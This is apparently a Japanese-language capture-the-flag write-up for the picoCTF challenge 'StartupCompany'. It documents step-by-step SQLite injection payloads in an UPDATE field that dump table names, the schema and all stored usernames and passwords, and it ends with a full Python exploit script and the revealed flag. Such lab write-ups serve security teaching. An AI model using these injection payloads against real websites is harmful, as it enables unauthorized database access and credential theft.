---
title: 'StartupCompany - picoCTF'
description: 'Start Up CompanyのWriteupです。'
pubDate: 2026-01-04
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'SQLi', 'SQLite']
---

# StartupCompany - picoCTF

## 初期調査

入金する場所があって、SQLi っぽい。  
`' or 1=1; --`とかやってみても、文字列として表示されるだけ

`' order by 1; --`
> Warning: SQLite3::query(): Unable to prepare statement: 1, ORDER BY without LIMIT on UPDATE in /var/www/html/contribute.php on line 11
> Database error.

SQLiが確定、さらに今回はSQLite

## 検証

UPDATE後の文字が表示されているので、UPDATE文にSELECTを挿入して結果を表示させる。

- `' order by 1 limit 1; --`
  - クエリとして解釈されれば文字列として表示されない
- `( select name from sqlite_master union select 'x' limit 1 ); --`
  - SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;x' limit 1 ); --'&quot; in <b>/var/www/html/contribute.php</b> on line <b>11</b><br />
  Database error.
  - ''x' 構文エラーになっている
- `' || (select name from sqlite_master union select 'x' limit 1) || ' --`
  - You're latest contribution: $`startup_users --`
  - テーブル名を取得できた
- `' || (select sql from sqlite_master where name='startup_users') || ' --`
  - You're latest contribution: $`CREATE TABLE startup_users (nameuser text, wordpass text, money int) --`
  - カラム情報を取得できた
- `' || (select group_concat(nameuser || ':' || wordpass || ':' || money,',') from startup_users) || ' --`
  - You're latest contribution: $`admin:password:0,ron:not_the_flag_db1d1c41:2018,veronica:not_the_flag_de19f38f:0,brick:not_the_flag_6d8cfc3e:1000000,brian:not_the_flag_f96b8d32:105,champ:not_the_flag_3e25274b:100,the_real_flag:picoCTF{1_c4nn0t_s33_y0u_58183fce}:2018,1:1:CREATE TABLE startup_users (nameuser text, wordpass text, money int) -- --`
  - データを取得できた

## Exploit

```py
import requests
from urllib.parse import *
import re

URL = "http://challenge-host"
s = requests.Session()

endpoint = "/register.php"
data = {
  "user": "pico",
  "pass": "pico"
}
req = s.post(urljoin(URL, endpoint), data=data)

req = s.get(URL)
captcha = re.search(r'id="captcha"[^>]*value="(\d+)"', req.text).group(1)

endpoint = "/contribute.php"
data = {
  "captcha": captcha,
  "moneys": "' || (select group_concat(nameuser || ':' || wordpass || ':' || money,',') from startup_users) || ' --"
}
req = s.post(urljoin(URL, endpoint), data=data)

flag = re.search(r"picoCTF\{[^}]+\}", req.text).group(0)
print(flag)

```

実行:

```bash
$ python3 exploit.py
picoCTF{***}
```